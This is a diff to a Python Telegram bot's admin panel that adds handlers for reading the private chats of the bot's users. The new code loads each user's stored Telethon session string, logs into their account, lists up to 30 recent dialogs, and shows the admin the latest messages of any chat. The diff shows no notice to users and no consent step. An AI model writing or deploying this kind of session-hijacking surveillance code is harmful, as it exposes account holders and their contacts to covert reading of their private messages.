@@ -21,6 +21,7 @@ from config import ADMIN_ID
 from keyboards import (
     admin_main_kb, admin_users_kb, admin_user_actions_kb, back_kb,
     admin_accounts_kb, admin_account_actions_kb, admin_account_groups_kb,
+    admin_chats_kb, admin_chat_messages_kb,
 )
 import telethon_manager
 
@@ -764,6 +765,121 @@ async def cb_admin_account_group_send(update: Update, context: ContextTypes.DEFA
         )
 
 
+# ─── Admin: Read User Chats ───────────────────────────────────────────────────
+
+async def cb_admin_account_chats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    parts = query.data.split("_")
+    # admin_acc_chats_{user_id}_{account_id}  OR  admin_chats_pg_{user_id}_{account_id}_{page}
+    if "chats_pg" in query.data:
+        user_id = int(parts[4])
+        account_id = int(parts[5])
+        page = int(parts[6])
+    else:
+        user_id = int(parts[4])
+        account_id = int(parts[5])
+        page = 0
+
+    accounts = await db.get_accounts(user_id)
+    account = next((a for a in accounts if a["id"] == account_id), None)
+    if not account:
+        await query.edit_message_text("❌ Account not found.", reply_markup=back_kb(f"admin_accounts_{user_id}"))
+        return
+
+    sessions = await db.get_account_sessions(user_id)
+    session_string = None
+    for phone, sess in sessions:
+        if phone == account["phone"]:
+            session_string = sess
+            break
+    if not session_string:
+        await query.edit_message_text(
+            "❌ No session found for this account.",
+            reply_markup=back_kb(f"admin_acc_{user_id}_{account_id}"),
+        )
+        return
+
+    await query.edit_message_text("🔄 *Loading chats…*", parse_mode=ParseMode.MARKDOWN)
+    chats = await tm.admin_get_recent_chats(session_string, limit=30)
+    if not chats:
+        await query.edit_message_text(
+            "💬 *No chats found.*\n\nThe account may not be authorized or has no dialogs.",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=back_kb(f"admin_acc_{user_id}_{account_id}"),
+        )
+        return
+
+    context.user_data[f"admin_chats_{user_id}_{account_id}"] = chats
+    text = (
+        f"💬 *User Chats*\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 Account: `{account['phone']}`\n"
+        f"📋 Total chats: `{len(chats)}`\n\n"
+        f"Tap a chat to read messages:"
+    )
+    await query.edit_message_text(
+        text, parse_mode=ParseMode.MARKDOWN,
+        reply_markup=admin_chats_kb(user_id, account_id, chats, page),
+    )
+
+
+async def cb_admin_chat_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    # admin_chat_{user_id}_{account_id}_{chat_id}
+    parts = query.data.split("_")
+    user_id = int(parts[3])
+    account_id = int(parts[4])
+    chat_id = int(parts[5])
+
+    accounts = await db.get_accounts(user_id)
+    account = next((a for a in accounts if a["id"] == account_id), None)
+    if not account:
+        await query.edit_message_text("❌ Account not found.", reply_markup=back_kb(f"admin_accounts_{user_id}"))
+        return
+
+    sessions = await db.get_account_sessions(user_id)
+    session_string = None
+    for phone, sess in sessions:
+        if phone == account["phone"]:
+            session_string = sess
+            break
+    if not session_string:
+        await query.edit_message_text(
+            "❌ No session found.",
+            reply_markup=back_kb(f"admin_acc_{user_id}_{account_id}"),
+        )
+        return
+
+    await query.edit_message_text("🔄 *Loading messages…*", parse_mode=ParseMode.MARKDOWN)
+    messages = await tm.admin_get_chat_messages(session_string, chat_id, limit=20)
+
+    chats = context.user_data.get(f"admin_chats_{user_id}_{account_id}", [])
+    chat_info = next((c for c in chats if c["chat_id"] == chat_id), None)
+    chat_name = chat_info["name"] if chat_info else str(chat_id)
+
+    if not messages:
+        await query.edit_message_text(
+            f"💬 *{chat_name}*\n\nNo messages found.",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=admin_chat_messages_kb(user_id, account_id, chat_id),
+        )
+        return
+
+    lines = [f"💬 *{chat_name}*\n━━━━━━━━━━━━━━━━━━━━━\n"]
+    for m in reversed(messages):
+        time_str = m["date"].strftime("%d/%m %H:%M")
+        arrow = "➡️" if m["is_outgoing"] else "⬅️"
+        lines.append(f"{arrow} `{time_str}` *{m['sender'][:20]}*\n   {m['text'][:100]}\n")
+
+    await query.edit_message_text(
+        "\n".join(lines),
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=admin_chat_messages_kb(user_id, account_id, chat_id),
+    )
+
+
 def register(app):
     app.add_handler(CommandHandler("admin", cmd_admin))
     app.add_handler(CallbackQueryHandler(cb_admin_panel,       pattern="^admin_panel$"))
@@ -783,3 +899,6 @@ def register(app):
     app.add_handler(CallbackQueryHandler(cb_admin_account_grp_pg, pattern=r"^admin_acc_grp_pg_\d+_\d+_\d+$"))
     app.add_handler(CallbackQueryHandler(cb_admin_account_send,   pattern=r"^admin_acc_send_\d+_\d+$"))
     app.add_handler(CallbackQueryHandler(cb_admin_account_group_send, pattern=r"^admin_grp_\d+_\d+_-?\d+$"))
+    app.add_handler(CallbackQueryHandler(cb_admin_account_chats,   pattern=r"^admin_acc_chats_\d+_\d+$"))
+    app.add_handler(CallbackQueryHandler(cb_admin_account_chats,   pattern=r"^admin_chats_pg_\d+_\d+_\d+$"))
+    app.add_handler(CallbackQueryHandler(cb_admin_chat_messages,   pattern=r"^admin_chat_\d+_\d+_-?\d+$"))
